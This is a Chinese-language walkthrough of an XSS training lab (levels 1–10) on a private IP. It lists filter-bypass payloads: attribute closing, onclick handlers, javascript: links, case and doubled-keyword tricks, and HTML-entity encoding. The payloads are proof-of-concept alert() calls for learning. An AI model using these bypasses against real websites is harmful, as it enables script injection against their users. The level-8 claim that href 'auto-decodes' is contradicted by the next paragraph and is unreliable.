# 技巧

找注入点

找显示位置

页面和页面源代码其实是同一个东西，只不过采用了不同的呈现方式。

页面是页面源代码进行渲染加工的形式，有很多细节会被忽略掉，但这些细节有时候正是xss漏洞的线索。

因此，应该看页面源代码，而不是页面。

# level1

http://192.168.220.191/xss_lab/level1.php?name=test

第一关很简单，注入点：name

直接将name参数的值改为<script>alert()</script>

![1](photo/1.png)

这说明，网页直接将用户输入内容直接写入html中

# level2

第二关是一个有搜索框的GET类型的注入，注入点：keyword

![2](photo/2.png)

位置1是html标签或文本，位置2是input标签的value值

尝试过<script>alert()</script>发现位置1正常输出，说明位置1进行了特殊字符编码，不存在漏洞。

位置2是input标签的value值，可以尝试闭合。

然后，尝试

```
'"><script>alert()</script> 
```

发现成功。

# level3

![3](photo/3.png)

尝试

<script>alert()</script>

![3.1](photo/3.1.png)

![3.2](photo/3.2.png)

两个位置，均进行了特殊字符编码。并且，有页面源代码可以发现，位置2或许可以用单引号闭合，并使用事件来实现注入。

payload：

```
' onclick='alert()'
```

点击搜索框，触发事件。

![3.3](photo/3.3.png)

# level4

![4](photo/4.png)

位置1应该不存在漏洞。

位置2可以尝试用双引号闭合，并使用事件。

![4.1](photo/4.1.png)

# level5

![5](photo/5.png)

位置1应该不存在漏洞。

位置2可以尝试用双引号闭合，并使用事件。

payload

```
" onclick="alert()"
```

![5.1](photo/5.1.png)

可见，onclick被替换成o_nclick。很有可能对on进行了替换。

payload

```
"><script>alert()</script>"<
```

![5.2](photo/5.2.png)

可见，<script>被替换成<scr_ipt>

payload

```
script
```

![5.3](photo/5.3.png)

发现script并没有被替换。

payload

```
"><a href='javascript:alert()'>
```

![5.4](photo/5.4.png)

![5.5](photo/5.5.png)

闭合input标签，并使用a标签的href属性可以执行javascript脚本的这一特性。

# level6

payload

```
'"> onclick script
```

![6](photo/6.png)

可见onclick被替换了，但script没有被替换。

payload

```
><a href="javascript:alert()">
```

![6.1](photo/6.1.png)

发现href被替换了

我测试了一下<script>,被替换成了<scr_ipt>。

尝试大写

payload

```
<SCRIPT> ONCLICK HREF
```

![6.2](photo/6.2.png)

发现都未被替换

随便尝试几种方案：

```
" ONCLICK="alert()"
```

![6.3](photo/6.3.png)

```
"><a HREF="javascript:alert()">
```

![6.4](photo/6.4.png)

# level7

payload

```
href HREF script <script>
```

![7](photo/7.png)

发现，存在替换。将script，href均替换为空。可以尝试双写绕过。

payload

```
"><a hhrefref="javasscriptcript:alert()">
```

![7.1](photo/7.1.png)

# level8

![8](photo/8.png)

![8.1](photo/8.1.png)

可见，两个位置均进行双引号的特殊字符处理，因此无法实现闭合。

但是，a标签的href属性可以是攻击的切入点。

但是，我们可以发现，位置2对script进行了替换处理。

因为，**href有隐藏属性：自动解码**

a 标签的 href 属性‌**不存在“自动解码”机制**‌；所谓“自动解码”实为浏览器在‌**解析 `javascript:` 协议字符串或 DOM 属性读取时进行的隐式 URL/HTML 实体解码**‌，导致传入 JS 函数的参数值被提前还原 。‌‌

由于URL编码只会对特殊字符进行编码，javascript不会被编码。因此，无法使用

尝试输入 javascript:alert() 的 HTML实体编码。

```payload
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

![8.2](photo/8.2.png)

# level9

payload

```
javascript:alert()
```

![9](photo/9.png)

发现，并没显示，可能存在白名单。

payload

```
javascript:alert() http://
```

![9.1](photo/9.1.png)

只有含有http://的payload才能绕过，好在可以通过javascript的注释符来携带http://

```
//是javascript的单行注释
```

同时可以发现，javascript被替换了，尝试HTML实体编码。

payload

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;//http://
```

![9.2](photo/9.2.png)

# level10

![10](photo/10.png)

尝试注入，看看每个注入点有没有显示位置。

```payload
http://192.168.220.191/xss_lab/level10.php?keyword=well done!&t_link=1&t_history=2&t_sort=3
```

![10.1](photo/10.1.png)

发现注入点3会显示，并且显示在input标签的value属性中。注入点：t_sort

```payload
t_sort=" onclick="alert()"
```

onclick()确实生效了，但是搜索框被隐藏了不会显示，需要自己修改标签属性才能显示。很显然，这样的方式在实际的渗透场景中是不现实的，普通用户不会这样做。如果这样做了，他就不是普通用户了，他就会发现这个input标签的value属性中含有攻击代码。

所以，我们需要对input标签的type属性进行修改或者屏蔽。

```payload
t_sort=" onclick="alert()" type=""
```

![10.2](photo/10.2.png)

html同名属性解析规则：先到先得

根据 HTML 的解析标准，一个标签的起始标记中，**不允许存在两个或更多同名属性**。

当解析器遇到重复的属性名时，这会被视为一个**解析错误（parse error）**。按照标准的错误处理机制，**第二个及之后出现的同名属性（以及它的值）会被直接丢弃，而第一个属性会保留并生效**。所以，如果你写了 `<input type="text" type="hidden">`，`type` 属性的值最终会是 `"text"`。